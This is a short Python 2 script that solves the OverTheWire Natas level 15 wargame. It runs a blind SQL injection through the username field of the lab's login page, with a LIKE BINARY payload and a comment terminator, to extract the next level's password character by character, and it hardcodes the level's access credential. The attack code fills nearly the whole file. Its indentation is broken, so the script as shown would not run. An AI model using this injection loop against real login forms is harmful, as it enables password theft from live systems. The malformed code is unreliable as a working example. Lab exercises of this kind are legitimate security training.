# -*- coding: utf-8 -*-
"""
Created on Sun Mar  1 18:41:40 2015

@author: George
"""

import urllib2, urllib, base64

#function to find password.
def get_password():
    
    #create characters I'm going to loop through.
    
    characters='abcdefghijklmnopqrstuvwxyz'
    characters+=characters.upper()
    characters+='0123456789'

    
    #with each loop we'll add the password characters we know
    #to the beginning of the search character.
    
    string_start=''
    for i in range(32):    
           for character in characters:
            
           #The string we want to check whether the password begins with.
           string="'"+string_start+character+"%'"
            
           #Connect to the web page, send username and password, then
	   #send our query as a parameter.
	    
           request = urllib2.Request("http://natas15.natas.labs.overthewire.org/index.php")
           base64string = base64.encodestring('%s:%s' % ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).replace('\n', '')
           request.add_header("Authorization", "Basic %s" % base64string)   
           params=urllib.urlencode({'username':'natas16" and password LIKE BINARY'+string+'#'})
           result = urllib2.urlopen(request,params)
            
           #Read the response, keep the important part, which we can use
	   #to test whether the character is the one we want. If it
	   #is then start looking for the next character. This continues
           #until we have them all.		 
	      
           text=result.readlines()
           decider=text[13].split('.')[0].split()[2]
           if decider=='exists':
                 print character
                 string_start+=character
                 break
    
    print string_start                    
            
get_password()            


            
